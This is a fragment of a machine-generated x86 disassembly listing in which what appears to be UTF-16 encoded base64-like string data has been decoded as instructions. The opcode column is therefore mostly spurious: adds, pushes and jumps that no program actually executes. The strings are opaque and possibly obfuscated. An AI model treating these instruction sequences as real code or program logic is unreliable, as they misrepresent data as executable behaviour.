  40ac34:	48                   	dec    %eax
  40ac35:	00 6f 00             	add    %ch,0x0(%edi)
  40ac38:	54                   	push   %esp
  40ac39:	00 79 00             	add    %bh,0x0(%ecx)
  40ac3c:	62 00                	bound  %eax,(%eax)
  40ac3e:	48                   	dec    %eax
  40ac3f:	00 6c 00 59          	add    %ch,0x59(%eax,%eax,1)
  40ac43:	00 32                	add    %dh,(%edx)
  40ac45:	00 74 00 46          	add    %dh,0x46(%eax,%eax,1)
  40ac49:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ac4c:	67 00 50 00          	add    %dl,0x0(%bx,%si)
  40ac50:	2b 00                	sub    (%eax),%eax
  40ac52:	57                   	push   %edi
  40ac53:	00 30                	add    %dh,(%eax)
  40ac55:	00 6f 00             	add    %ch,0x0(%edi)
  40ac58:	58                   	pop    %eax
  40ac59:	00 68 00             	add    %ch,0x0(%eax)
  40ac5c:	52                   	push   %edx
  40ac5d:	00 74 00 47          	add    %dh,0x47(%eax,%eax,1)
  40ac61:	00 4f 00             	add    %cl,0x0(%edi)
  40ac64:	63 00                	arpl   %eax,(%eax)
  40ac66:	2f                   	das
  40ac67:	00 7a 00             	add    %bh,0x0(%edx)
  40ac6a:	35 00 48 00 65       	xor    $0x65004800,%eax
  40ac6f:	00 6e 00             	add    %ch,0x0(%esi)
  40ac72:	4a                   	dec    %edx
  40ac73:	00 50 00             	add    %dl,0x0(%eax)
  40ac76:	6b 00 34             	imul   $0x34,(%eax),%eax
  40ac79:	00 6d 00             	add    %ch,0x0(%ebp)
  40ac7c:	79 00                	jns    0x40ac7e
  40ac7e:	43                   	inc    %ebx
  40ac7f:	00 32                	add    %dh,(%edx)
  40ac81:	00 79 00             	add    %bh,0x0(%ecx)
  40ac84:	43                   	inc    %ebx
  40ac85:	00 52 00             	add    %dl,0x0(%edx)
  40ac88:	6c                   	insb   (%dx),%es:(%edi)
  40ac89:	00 61 00             	add    %ah,0x0(%ecx)
  40ac8c:	79 00                	jns    0x40ac8e
  40ac8e:	54                   	push   %esp
  40ac8f:	00 30                	add    %dh,(%eax)
  40ac91:	00 54 00 6f          	add    %dl,0x6f(%eax,%eax,1)
  40ac95:	00 70 00             	add    %dh,0x0(%eax)
  40ac98:	6e                   	outsb  %ds:(%esi),(%dx)
  40ac99:	00 5a 00             	add    %bl,0x0(%edx)
  40ac9c:	4d                   	dec    %ebp
  40ac9d:	00 47 00             	add    %al,0x0(%edi)
  40aca0:	70 00                	jo     0x40aca2
  40aca2:	52                   	push   %edx
  40aca3:	00 4e 00             	add    %cl,0x0(%esi)
  40aca6:	76 00                	jbe    0x40aca8
  40aca8:	45                   	inc    %ebp
  40aca9:	00 75 00             	add    %dh,0x0(%ebp)
  40acac:	31 00                	xor    %eax,(%eax)
  40acae:	5a                   	pop    %edx
  40acaf:	00 36                	add    %dh,(%esi)
  40acb1:	00 32                	add    %dh,(%edx)
  40acb3:	00 4b 00             	add    %cl,0x0(%ebx)
  40acb6:	37                   	aaa
  40acb7:	00 7a 00             	add    %bh,0x0(%edx)
  40acba:	51                   	push   %ecx
  40acbb:	00 7a 00             	add    %bh,0x0(%edx)
  40acbe:	67 00 3d             	add    %bh,(%di)
  40acc1:	00 00                	add    %al,(%eax)
  40acc3:	87 b1 57 00 76 00    	xchg   %esi,0x760057(%ecx)
  40acc9:	47                   	inc    %edi
  40acca:	00 6d 00             	add    %ch,0x0(%ebp)
  40accd:	66 00 7a 00          	data16 add %bh,0x0(%edx)
  40acd1:	6e                   	outsb  %ds:(%esi),(%dx)
  40acd2:	00 41 00             	add    %al,0x0(%ecx)
  40acd5:	68 00 58 00 4a       	push   $0x4a005800
  40acda:	00 54 00 79          	add    %dl,0x79(%eax,%eax,1)
  40acde:	00 67 00             	add    %ah,0x0(%edi)
  40ace1:	75 00                	jne    0x40ace3
  40ace3:	52                   	push   %edx
  40ace4:	00 68 00             	add    %ch,0x0(%eax)
  40ace7:	6b 00 35             	imul   $0x35,(%eax),%eax
  40acea:	00 50 00             	add    %dl,0x0(%eax)
  40aced:	4f                   	dec    %edi
  40acee:	00 48 00             	add    %cl,0x0(%eax)
  40acf1:	4c                   	dec    %esp
  40acf2:	00 63 00             	add    %ah,0x0(%ebx)
  40acf5:	2b 00                	sub    (%eax),%eax
  40acf7:	6b 00 38             	imul   $0x38,(%eax),%eax
  40acfa:	00 61 00             	add    %ah,0x0(%ecx)
  40acfd:	6b 00 79             	imul   $0x79,(%eax),%eax
  40ad00:	00 4b 00             	add    %cl,0x0(%ebx)
  40ad03:	32 00                	xor    (%eax),%al
  40ad05:	58                   	pop    %eax
  40ad06:	00 47 00             	add    %al,0x0(%edi)
  40ad09:	6e                   	outsb  %ds:(%esi),(%dx)
  40ad0a:	00 53 00             	add    %dl,0x0(%ebx)
  40ad0d:	48                   	dec    %eax
  40ad0e:	00 63 00             	add    %ah,0x0(%ebx)
  40ad11:	6a 00                	push   $0x0
  40ad13:	48                   	dec    %eax
  40ad14:	00 30                	add    %dh,(%eax)
  40ad16:	00 4f 00             	add    %cl,0x0(%edi)
  40ad19:	30 00                	xor    %al,(%eax)
  40ad1b:	7a 00                	jp     0x40ad1d
  40ad1d:	71 00                	jno    0x40ad1f
  40ad1f:	4a                   	dec    %edx
  40ad20:	00 6a 00             	add    %ch,0x0(%edx)
  40ad23:	4f                   	dec    %edi
  40ad24:	00 76 00             	add    %dh,0x0(%esi)
  40ad27:	61                   	popa
  40ad28:	00 79 00             	add    %bh,0x0(%ecx)
  40ad2b:	4f                   	dec    %edi
  40ad2c:	00 66 00             	add    %ah,0x0(%esi)
  40ad2f:	47                   	inc    %edi
  40ad30:	00 7a 00             	add    %bh,0x0(%edx)
  40ad33:	46                   	inc    %esi
  40ad34:	00 43 00             	add    %al,0x0(%ebx)
  40ad37:	6e                   	outsb  %ds:(%esi),(%dx)
  40ad38:	00 75 00             	add    %dh,0x0(%ebp)
  40ad3b:	56                   	push   %esi
  40ad3c:	00 69 00             	add    %ch,0x0(%ecx)
  40ad3f:	4f                   	dec    %edi
  40ad40:	00 61 00             	add    %ah,0x0(%ecx)
  40ad43:	33 00                	xor    (%eax),%eax
  40ad45:	47                   	inc    %edi
  40ad46:	00 4f 00             	add    %cl,0x0(%edi)
  40ad49:	52                   	push   %edx
  40ad4a:	00 46 00             	add    %al,0x0(%esi)
  40ad4d:	51                   	push   %ecx
  40ad4e:	00 6c 00 36          	add    %ch,0x36(%eax,%eax,1)
  40ad52:	00 5a 00             	add    %bl,0x0(%edx)
  40ad55:	4b                   	dec    %ebx
  40ad56:	00 37                	add    %dh,(%edi)
  40ad58:	00 56 00             	add    %dl,0x0(%esi)
  40ad5b:	71 00                	jno    0x40ad5d
  40ad5d:	53                   	push   %ebx
  40ad5e:	00 5a 00             	add    %bl,0x0(%edx)
  40ad61:	46                   	inc    %esi
  40ad62:	00 4b 00             	add    %cl,0x0(%ebx)
  40ad65:	4c                   	dec    %esp
  40ad66:	00 69 00             	add    %ch,0x0(%ecx)
  40ad69:	38 00                	cmp    %al,(%eax)
  40ad6b:	4d                   	dec    %ebp
  40ad6c:	00 55 00             	add    %dl,0x0(%ebp)
  40ad6f:	50                   	push   %eax
  40ad70:	00 4e 00             	add    %cl,0x0(%esi)
  40ad73:	65 00 2b             	add    %ch,%gs:(%ebx)
  40ad76:	00 55 00             	add    %dl,0x0(%ebp)
  40ad79:	47                   	inc    %edi
  40ad7a:	00 62 00             	add    %ah,0x0(%edx)
  40ad7d:	68 00 6f 00 42       	push   $0x42006f00
  40ad82:	00 68 00             	add    %ch,0x0(%eax)
  40ad85:	68 00 31 00 55       	push   $0x55003100
  40ad8a:	00 67 00             	add    %ah,0x0(%edi)
  40ad8d:	35 00 78 00 4d       	xor    $0x4d007800,%eax
  40ad92:	00 68 00             	add    %ch,0x0(%eax)
  40ad95:	31 00                	xor    %eax,(%eax)
  40ad97:	64 00 30             	add    %dh,%fs:(%eax)
  40ad9a:	00 2f                	add    %ch,(%edi)
  40ad9c:	00 6f 00             	add    %ch,0x0(%edi)
  40ad9f:	4e                   	dec    %esi
  40ada0:	00 74 00 6c          	add    %dh,0x6c(%eax,%eax,1)
  40ada4:	00 56 00             	add    %dl,0x0(%esi)
  40ada7:	74 00                	je     0x40ada9
  40ada9:	75 00                	jne    0x40adab
  40adab:	51                   	push   %ecx
  40adac:	00 6b 00             	add    %ch,0x0(%ebx)
  40adaf:	72 00                	jb     0x40adb1
  40adb1:	53                   	push   %ebx
  40adb2:	00 49 00             	add    %cl,0x0(%ecx)
  40adb5:	7a 00                	jp     0x40adb7
  40adb7:	67 00 6b 00          	add    %ch,0x0(%bp,%di)
  40adbb:	68 00 45 00 35       	push   $0x35004500
  40adc0:	00 68 00             	add    %ch,0x0(%eax)
  40adc3:	52                   	push   %edx
  40adc4:	00 4f 00             	add    %cl,0x0(%edi)
  40adc7:	70 00                	jo     0x40adc9
  40adc9:	36 00 6f 00          	add    %ch,%ss:0x0(%edi)
  40adcd:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  40add1:	47                   	inc    %edi
  40add2:	00 57 00             	add    %dl,0x0(%edi)
  40add5:	49                   	dec    %ecx
  40add6:	00 72 00             	add    %dh,0x0(%edx)
  40add9:	55                   	push   %ebp
  40adda:	00 65 00             	add    %ah,0x0(%ebp)
  40addd:	77 00                	ja     0x40addf
  40addf:	6e                   	outsb  %ds:(%esi),(%dx)
  40ade0:	00 55 00             	add    %dl,0x0(%ebp)
  40ade3:	5a                   	pop    %edx
  40ade4:	00 31                	add    %dh,(%ecx)
  40ade6:	00 52 00             	add    %dl,0x0(%edx)
  40ade9:	2b 00                	sub    (%eax),%eax
  40adeb:	65 00 68 00          	add    %ch,%gs:0x0(%eax)
  40adef:	67 00 44 00          	add    %al,0x0(%si)
  40adf3:	44                   	inc    %esp
  40adf4:	00 66 00             	add    %ah,0x0(%esi)
  40adf7:	41                   	inc    %ecx
  40adf8:	00 78 00             	add    %bh,0x0(%eax)
  40adfb:	58                   	pop    %eax
  40adfc:	00 48 00             	add    %cl,0x0(%eax)
  40adff:	2b 00                	sub    (%eax),%eax
  40ae01:	56                   	push   %esi
  40ae02:	00 73 00             	add    %dh,0x0(%ebx)
  40ae05:	54                   	push   %esp
  40ae06:	00 4d 00             	add    %cl,0x0(%ebp)
  40ae09:	59                   	pop    %ecx
  40ae0a:	00 78 00             	add    %bh,0x0(%eax)
  40ae0d:	77 00                	ja     0x40ae0f
  40ae0f:	66 00 4c 00 2f       	data16 add %cl,0x2f(%eax,%eax,1)
  40ae14:	00 2b                	add    %ch,(%ebx)
  40ae16:	00 75 00             	add    %dh,0x0(%ebp)
  40ae19:	72 00                	jb     0x40ae1b
  40ae1b:	54                   	push   %esp
  40ae1c:	00 61 00             	add    %ah,0x0(%ecx)
  40ae1f:	52                   	push   %edx
  40ae20:	00 2f                	add    %ch,(%edi)
  40ae22:	00 67 00             	add    %ah,0x0(%edi)
  40ae25:	66 00 68 00          	data16 add %ch,0x0(%eax)
  40ae29:	77 00                	ja     0x40ae2b
  40ae2b:	78 00                	js     0x40ae2d
  40ae2d:	68 00 7a 00 58       	push   $0x58007a00
  40ae32:	00 51 00             	add    %dl,0x0(%ecx)
  40ae35:	37                   	aaa
  40ae36:	00 55 00             	add    %dl,0x0(%ebp)
  40ae39:	34 00                	xor    $0x0,%al
  40ae3b:	6e                   	outsb  %ds:(%esi),(%dx)
  40ae3c:	00 54 00 42          	add    %dl,0x42(%eax,%eax,1)
  40ae40:	00 72 00             	add    %dh,0x0(%edx)
  40ae43:	55                   	push   %ebp
  40ae44:	00 67 00             	add    %ah,0x0(%edi)
  40ae47:	50                   	push   %eax
  40ae48:	00 32                	add    %dh,(%edx)
  40ae4a:	00 70 00             	add    %dh,0x0(%eax)
  40ae4d:	6b 00 4e             	imul   $0x4e,(%eax),%eax
  40ae50:	00 46 00             	add    %al,0x0(%esi)
  40ae53:	6a 00                	push   $0x0
  40ae55:	4b                   	dec    %ebx
  40ae56:	00 64 00 41          	add    %ah,0x41(%eax,%eax,1)
  40ae5a:	00 46 00             	add    %al,0x0(%esi)
  40ae5d:	43                   	inc    %ebx
  40ae5e:	00 5a 00             	add    %bl,0x0(%edx)
  40ae61:	76 00                	jbe    0x40ae63
  40ae63:	52                   	push   %edx
  40ae64:	00 42 00             	add    %al,0x0(%edx)
  40ae67:	67 00 43 00          	add    %al,0x0(%bp,%di)
  40ae6b:	69 00 73 00 64 00    	imul   $0x640073,(%eax),%eax
  40ae71:	6d                   	insl   (%dx),%es:(%edi)
  40ae72:	00 66 00             	add    %ah,0x0(%esi)
  40ae75:	4f                   	dec    %edi
  40ae76:	00 38                	add    %bh,(%eax)
  40ae78:	00 32                	add    %dh,(%edx)
  40ae7a:	00 59 00             	add    %bl,0x0(%ecx)
  40ae7d:	6e                   	outsb  %ds:(%esi),(%dx)
  40ae7e:	00 6f 00             	add    %ch,0x0(%edi)
  40ae81:	56                   	push   %esi
  40ae82:	00 75 00             	add    %dh,0x0(%ebp)
  40ae85:	4a                   	dec    %edx
  40ae86:	00 6d 00             	add    %ch,0x0(%ebp)
  40ae89:	63 00                	arpl   %eax,(%eax)
  40ae8b:	4f                   	dec    %edi
  40ae8c:	00 76 00             	add    %dh,0x0(%esi)
  40ae8f:	6b 00 68             	imul   $0x68,(%eax),%eax
  40ae92:	00 6f 00             	add    %ch,0x0(%edi)
  40ae95:	74 00                	je     0x40ae97
  40ae97:	76 00                	jbe    0x40ae99
  40ae99:	6c                   	insb   (%dx),%es:(%edi)
  40ae9a:	00 50 00             	add    %dl,0x0(%eax)
  40ae9d:	5a                   	pop    %edx
  40ae9e:	00 49 00             	add    %cl,0x0(%ecx)
  40aea1:	6d                   	insl   (%dx),%es:(%edi)
  40aea2:	00 32                	add    %dh,(%edx)
  40aea4:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40aea8:	00 56 00             	add    %dl,0x0(%esi)
  40aeab:	34 00                	xor    $0x0,%al
  40aead:	4a                   	dec    %edx
  40aeae:	00 4f 00             	add    %cl,0x0(%edi)
  40aeb1:	4a                   	dec    %edx
  40aeb2:	00 71 00             	add    %dh,0x0(%ecx)
  40aeb5:	46                   	inc    %esi
  40aeb6:	00 72 00             	add    %dh,0x0(%edx)
  40aeb9:	6c                   	insb   (%dx),%es:(%edi)
  40aeba:	00 79 00             	add    %bh,0x0(%ecx)
  40aebd:	2b 00                	sub    (%eax),%eax
  40aebf:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  40aec3:	34 00                	xor    $0x0,%al
  40aec5:	55                   	push   %ebp
  40aec6:	00 45 00             	add    %al,0x0(%ebp)
  40aec9:	4c                   	dec    %esp
  40aeca:	00 2f                	add    %ch,(%edi)
  40aecc:	00 5a 00             	add    %bl,0x0(%edx)
  40aecf:	4c                   	dec    %esp
  40aed0:	00 37                	add    %dh,(%edi)
  40aed2:	00 54 00 32          	add    %dl,0x32(%eax,%eax,1)
  40aed6:	00 34 00             	add    %dh,(%eax,%eax,1)
  40aed9:	58                   	pop    %eax
  40aeda:	00 72 00             	add    %dh,0x0(%edx)
  40aedd:	77 00                	ja     0x40aedf
  40aedf:	33 00                	xor    (%eax),%eax
  40aee1:	36 00 69 00          	add    %ch,%ss:0x0(%ecx)
  40aee5:	6b 00 6b             	imul   $0x6b,(%eax),%eax
  40aee8:	00 51 00             	add    %dl,0x0(%ecx)
  40aeeb:	48                   	dec    %eax
  40aeec:	00 61 00             	add    %ah,0x0(%ecx)
  40aeef:	35 00 56 00 69       	xor    $0x69005600,%eax
  40aef4:	00 2f                	add    %ch,(%edi)
  40aef6:	00 6c 00 78          	add    %ch,0x78(%eax,%eax,1)
  40aefa:	00 52 00             	add    %dl,0x0(%edx)
  40aefd:	4e                   	dec    %esi
  40aefe:	00 78 00             	add    %bh,0x0(%eax)
  40af01:	79 00                	jns    0x40af03
  40af03:	44                   	inc    %esp
  40af04:	00 46 00             	add    %al,0x0(%esi)
  40af07:	71 00                	jno    0x40af09
  40af09:	53                   	push   %ebx
  40af0a:	00 32                	add    %dh,(%edx)
  40af0c:	00 79 00             	add    %bh,0x0(%ecx)
  40af0f:	45                   	inc    %ebp
  40af10:	00 56 00             	add    %dl,0x0(%esi)
  40af13:	59                   	pop    %ecx
  40af14:	00 32                	add    %dh,(%edx)
  40af16:	00 51 00             	add    %dl,0x0(%ecx)
  40af19:	70 00                	jo     0x40af1b
  40af1b:	6d                   	insl   (%dx),%es:(%edi)
  40af1c:	00 4f 00             	add    %cl,0x0(%edi)
  40af1f:	4f                   	dec    %edi
  40af20:	00 58 00             	add    %bl,0x0(%eax)
  40af23:	67 00 61 00          	add    %ah,0x0(%bx,%di)
  40af27:	4b                   	dec    %ebx
  40af28:	00 41 00             	add    %al,0x0(%ecx)
  40af2b:	41                   	inc    %ecx
  40af2c:	00 42 00             	add    %al,0x0(%edx)
  40af2f:	31 00                	xor    %eax,(%eax)
  40af31:	52                   	push   %edx
  40af32:	00 42 00             	add    %al,0x0(%edx)
  40af35:	4c                   	dec    %esp
  40af36:	00 75 00             	add    %dh,0x0(%ebp)
  40af39:	68 00 67 00 46       	push   $0x46006700
  40af3e:	00 55 00             	add    %dl,0x0(%ebp)
  40af41:	39 00                	cmp    %eax,(%eax)
  40af43:	38 00                	cmp    %al,(%eax)
  40af45:	74 00                	je     0x40af47
  40af47:	58                   	pop    %eax
  40af48:	00 68 00             	add    %ch,0x0(%eax)
  40af4b:	75 00                	jne    0x40af4d
  40af4d:	68 00 68 00 78       	push   $0x78006800
  40af52:	00 39                	add    %bh,(%ecx)
  40af54:	00 4f 00             	add    %cl,0x0(%edi)
  40af57:	36 00 5a 00          	add    %bl,%ss:0x0(%edx)
  40af5b:	76 00                	jbe    0x40af5d
  40af5d:	69 00 42 00 70 00    	imul   $0x700042,(%eax),%eax
  40af63:	68 00 49 00 41       	push   $0x41004900
  40af68:	00 6f 00             	add    %ch,0x0(%edi)
  40af6b:	54                   	push   %esp
  40af6c:	00 66 00             	add    %ah,0x0(%esi)
  40af6f:	51                   	push   %ecx
  40af70:	00 6d 00             	add    %ch,0x0(%ebp)
  40af73:	34 00                	xor    $0x0,%al
  40af75:	37                   	aaa
  40af76:	00 4f 00             	add    %cl,0x0(%edi)
  40af79:	70 00                	jo     0x40af7b
  40af7b:	69 00 6a 00 39 00    	imul   $0x39006a,(%eax),%eax
  40af81:	6d                   	insl   (%dx),%es:(%edi)
  40af82:	00 30                	add    %dh,(%eax)
  40af84:	00 67 00             	add    %ah,0x0(%edi)
  40af87:	4f                   	dec    %edi
  40af88:	00 63 00             	add    %ah,0x0(%ebx)
  40af8b:	44                   	inc    %esp
  40af8c:	00 4c 00 6b          	add    %cl,0x6b(%eax,%eax,1)
  40af90:	00 2f                	add    %ch,(%edi)
  40af92:	00 38                	add    %bh,(%eax)
  40af94:	00 66 00             	add    %ah,0x0(%esi)
  40af97:	62 00                	bound  %eax,(%eax)
  40af99:	71 00                	jno    0x40af9b
  40af9b:	6c                   	insb   (%dx),%es:(%edi)
  40af9c:	00 6e 00             	add    %ch,0x0(%esi)
  40af9f:	4d                   	dec    %ebp
  40afa0:	00 35 00 79 00 6f    	add    %dh,0x6f007900
  40afa6:	00 4b 00             	add    %cl,0x0(%ebx)
  40afa9:	79 00                	jns    0x40afab
  40afab:	72 00                	jb     0x40afad
  40afad:	71 00                	jno    0x40afaf
  40afaf:	49                   	dec    %ecx
  40afb0:	00 62 00             	add    %ah,0x0(%edx)
  40afb3:	39 00                	cmp    %eax,(%eax)
  40afb5:	30 00                	xor    %al,(%eax)
  40afb7:	4b                   	dec    %ebx
  40afb8:	00 71 00             	add    %dh,0x0(%ecx)
  40afbb:	45                   	inc    %ebp
  40afbc:	00 68 00             	add    %ch,0x0(%eax)
  40afbf:	4e                   	dec    %esi
  40afc0:	00 78 00             	add    %bh,0x0(%eax)
  40afc3:	70 00                	jo     0x40afc5
  40afc5:	61                   	popa
  40afc6:	00 45 00             	add    %al,0x0(%ebp)
  40afc9:	5a                   	pop    %edx
  40afca:	00 74 00 53          	add    %dh,0x53(%eax,%eax,1)
  40afce:	00 65 00             	add    %ah,0x0(%ebp)
  40afd1:	2f                   	das
  40afd2:	00 75 00             	add    %dh,0x0(%ebp)
  40afd5:	6f                   	outsl  %ds:(%esi),(%dx)
  40afd6:	00 48 00             	add    %cl,0x0(%eax)
  40afd9:	68 00 78 00 2b       	push   $0x2b007800
  40afde:	00 64 00 4a          	add    %ah,0x4a(%eax,%eax,1)
  40afe2:	00 43 00             	add    %al,0x0(%ebx)
  40afe5:	52                   	push   %edx
  40afe6:	00 64 00 4e          	add    %ah,0x4e(%eax,%eax,1)
  40afea:	00 68 00             	add    %ch,0x0(%eax)
  40afed:	4d                   	dec    %ebp
  40afee:	00 48 00             	add    %cl,0x0(%eax)
  40aff1:	48                   	dec    %eax
  40aff2:	00 77 00             	add    %dh,0x0(%edi)
  40aff5:	61                   	popa
  40aff6:	00 7a 00             	add    %bh,0x0(%edx)
  40aff9:	6c                   	insb   (%dx),%es:(%edi)
  40affa:	00 51 00             	add    %dl,0x0(%ecx)
  40affd:	66 00 33             	data16 add %dh,(%ebx)
  40b000:	00 47 00             	add    %al,0x0(%edi)
  40b003:	72 00                	jb     0x40b005
  40b005:	55                   	push   %ebp
  40b006:	00 37                	add    %dh,(%edi)
  40b008:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b00b:	62 00                	bound  %eax,(%eax)
  40b00d:	72 00                	jb     0x40b00f
  40b00f:	42                   	inc    %edx
  40b010:	00 63 00             	add    %ah,0x0(%ebx)
  40b013:	57                   	push   %edi
  40b014:	00 6b 00             	add    %ch,0x0(%ebx)
  40b017:	38 00                	cmp    %al,(%eax)
  40b019:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  40b01d:	4a                   	dec    %edx
  40b01e:	00 49 00             	add    %cl,0x0(%ecx)
  40b021:	4d                   	dec    %ebp
  40b022:	00 4c 00 51          	add    %cl,0x51(%eax,%eax,1)
  40b026:	00 2f                	add    %ch,(%edi)
  40b028:	00 38                	add    %bh,(%eax)
  40b02a:	00 66 00             	add    %ah,0x0(%esi)
  40b02d:	7a 00                	jp     0x40b02f
  40b02f:	63 00                	arpl   %eax,(%eax)
  40b031:	55                   	push   %ebp
  40b032:	00 33                	add    %dh,(%ebx)
  40b034:	00 6f 00             	add    %ch,0x0(%edi)
  40b037:	2f                   	das
  40b038:	00 4a 00             	add    %cl,0x0(%edx)
  40b03b:	32 00                	xor    (%eax),%al
  40b03d:	41                   	inc    %ecx
  40b03e:	00 39                	add    %bh,(%ecx)
  40b040:	00 6b 00             	add    %ch,0x0(%ebx)
  40b043:	39 00                	cmp    %eax,(%eax)
  40b045:	34 00                	xor    $0x0,%al
  40b047:	31 00                	xor    %eax,(%eax)
  40b049:	6d                   	insl   (%dx),%es:(%edi)
  40b04a:	00 6c 00 70          	add    %ch,0x70(%eax,%eax,1)
  40b04e:	00 35 00 6c 00 39    	add    %dh,0x39006c00
  40b054:	00 58 00             	add    %bl,0x0(%eax)
  40b057:	35 00 53 00 4a       	xor    $0x4a005300,%eax
  40b05c:	00 5a 00             	add    %bl,0x0(%edx)
  40b05f:	4d                   	dec    %ebp
  40b060:	00 66 00             	add    %ah,0x0(%esi)
  40b063:	7a 00                	jp     0x40b065
  40b065:	79 00                	jns    0x40b067
  40b067:	57                   	push   %edi
  40b068:	00 56 00             	add    %dl,0x0(%esi)
  40b06b:	31 00                	xor    %eax,(%eax)
  40b06d:	64 00 42 00          	add    %al,%fs:0x0(%edx)
  40b071:	4d                   	dec    %ebp
  40b072:	00 73 00             	add    %dh,0x0(%ebx)
  40b075:	73 00                	jae    0x40b077
  40b077:	34 00                	xor    $0x0,%al
  40b079:	63 00                	arpl   %eax,(%eax)
  40b07b:	2b 00                	sub    (%eax),%eax
  40b07d:	46                   	inc    %esi
  40b07e:	00 6b 00             	add    %ch,0x0(%ebx)
  40b081:	6c                   	insb   (%dx),%es:(%edi)
  40b082:	00 4a 00             	add    %cl,0x0(%edx)
  40b085:	73 00                	jae    0x40b087
  40b087:	6a 00                	push   $0x0
  40b089:	76 00                	jbe    0x40b08b
  40b08b:	6a 00                	push   $0x0
  40b08d:	4e                   	dec    %esi
  40b08e:	00 35 00 75 00 57    	add    %dh,0x57007500
  40b094:	00 4f 00             	add    %cl,0x0(%edi)
  40b097:	72 00                	jb     0x40b099
  40b099:	51                   	push   %ecx
  40b09a:	00 49 00             	add    %cl,0x0(%ecx)
  40b09d:	4b                   	dec    %ebx
  40b09e:	00 71 00             	add    %dh,0x0(%ecx)
  40b0a1:	4b                   	dec    %ebx
  40b0a2:	00 43 00             	add    %al,0x0(%ebx)
  40b0a5:	79 00                	jns    0x40b0a7
  40b0a7:	59                   	pop    %ecx
  40b0a8:	00 4e 00             	add    %cl,0x0(%esi)
  40b0ab:	37                   	aaa
  40b0ac:	00 46 00             	add    %al,0x0(%esi)
  40b0af:	35 00 46 00 58       	xor    $0x58004600,%eax
  40b0b4:	00 32                	add    %dh,(%edx)
  40b0b6:	00 76 00             	add    %dh,0x0(%esi)
  40b0b9:	75 00                	jne    0x40b0bb
  40b0bb:	75 00                	jne    0x40b0bd
  40b0bd:	4d                   	dec    %ebp
  40b0be:	00 75 00             	add    %dh,0x0(%ebp)
  40b0c1:	73 00                	jae    0x40b0c3
  40b0c3:	74 00                	je     0x40b0c5
  40b0c5:	38 00                	cmp    %al,(%eax)
  40b0c7:	69 00 4f 00 67 00    	imul   $0x67004f,(%eax),%eax
  40b0cd:	62 00                	bound  %eax,(%eax)
  40b0cf:	57                   	push   %edi
  40b0d0:	00 5a 00             	add    %bl,0x0(%edx)
  40b0d3:	77 00                	ja     0x40b0d5
  40b0d5:	65 00 55 00          	add    %dl,%gs:0x0(%ebp)
  40b0d9:	7a 00                	jp     0x40b0db
  40b0db:	33 00                	xor    (%eax),%eax
  40b0dd:	39 00                	cmp    %eax,(%eax)
  40b0df:	49                   	dec    %ecx
  40b0e0:	00 45 00             	add    %al,0x0(%ebp)
  40b0e3:	4f                   	dec    %edi
  40b0e4:	00 44 00 2f          	add    %al,0x2f(%eax,%eax,1)
  40b0e8:	00 61 00             	add    %ah,0x0(%ecx)
  40b0eb:	31 00                	xor    %eax,(%eax)
  40b0ed:	63 00                	arpl   %eax,(%eax)
  40b0ef:	53                   	push   %ebx
  40b0f0:	00 76 00             	add    %dh,0x0(%esi)
  40b0f3:	4e                   	dec    %esi
  40b0f4:	00 4a 00             	add    %cl,0x0(%edx)
  40b0f7:	34 00                	xor    $0x0,%al
  40b0f9:	51                   	push   %ecx
  40b0fa:	00 6f 00             	add    %ch,0x0(%edi)
  40b0fd:	4f                   	dec    %edi
  40b0fe:	00 4a 00             	add    %cl,0x0(%edx)
  40b101:	76 00                	jbe    0x40b103
  40b103:	61                   	popa
  40b104:	00 6a 00             	add    %ch,0x0(%edx)
  40b107:	32 00                	xor    (%eax),%al
  40b109:	6a 00                	push   $0x0
  40b10b:	6e                   	outsb  %ds:(%esi),(%dx)
  40b10c:	00 74 00 55          	add    %dh,0x55(%eax,%eax,1)
  40b110:	00 50 00             	add    %dl,0x0(%eax)
  40b113:	78 00                	js     0x40b115
  40b115:	7a 00                	jp     0x40b117
  40b117:	77 00                	ja     0x40b119
  40b119:	51                   	push   %ecx
  40b11a:	00 78 00             	add    %bh,0x0(%eax)
  40b11d:	35 00 2b 00 53       	xor    $0x53002b00,%eax
  40b122:	00 4a 00             	add    %cl,0x0(%edx)
  40b125:	34 00                	xor    $0x0,%al
  40b127:	79 00                	jns    0x40b129
  40b129:	39 00                	cmp    %eax,(%eax)
  40b12b:	49                   	dec    %ecx
  40b12c:	00 68 00             	add    %ch,0x0(%eax)
  40b12f:	63 00                	arpl   %eax,(%eax)
  40b131:	69 00 33 00 36 00    	imul   $0x360033,(%eax),%eax
  40b137:	53                   	push   %ebx
  40b138:	00 55 00             	add    %dl,0x0(%ebp)
  40b13b:	53                   	push   %ebx
  40b13c:	00 65 00             	add    %ah,0x0(%ebp)
  40b13f:	63 00                	arpl   %eax,(%eax)
  40b141:	6a 00                	push   $0x0
  40b143:	43                   	inc    %ebx
  40b144:	00 47 00             	add    %al,0x0(%edi)
  40b147:	39 00                	cmp    %eax,(%eax)
  40b149:	37                   	aaa
  40b14a:	00 73 00             	add    %dh,0x0(%ebx)
  40b14d:	70 00                	jo     0x40b14f
  40b14f:	68 00 46 00 47       	push   $0x47004600
  40b154:	00 4b 00             	add    %cl,0x0(%ebx)
  40b157:	38 00                	cmp    %al,(%eax)
  40b159:	39 00                	cmp    %eax,(%eax)
  40b15b:	4c                   	dec    %esp
  40b15c:	00 72 00             	add    %dh,0x0(%edx)
  40b15f:	30 00                	xor    %al,(%eax)
  40b161:	61                   	popa
  40b162:	00 50 00             	add    %dl,0x0(%eax)
  40b165:	55                   	push   %ebp
  40b166:	00 4b 00             	add    %cl,0x0(%ebx)
  40b169:	33 00                	xor    (%eax),%eax
  40b16b:	77 00                	ja     0x40b16d
  40b16d:	33 00                	xor    (%eax),%eax
  40b16f:	72 00                	jb     0x40b171
  40b171:	6b 00 73             	imul   $0x73,(%eax),%eax
  40b174:	00 43 00             	add    %al,0x0(%ebx)
  40b177:	34 00                	xor    $0x0,%al
  40b179:	52                   	push   %edx
  40b17a:	00 45 00             	add    %al,0x0(%ebp)
  40b17d:	58                   	pop    %eax
  40b17e:	00 76 00             	add    %dh,0x0(%esi)
  40b181:	33 00                	xor    (%eax),%eax
  40b183:	32 00                	xor    (%eax),%al
  40b185:	4e                   	dec    %esi
  40b186:	00 39                	add    %bh,(%ecx)
  40b188:	00 78 00             	add    %bh,0x0(%eax)
  40b18b:	58                   	pop    %eax
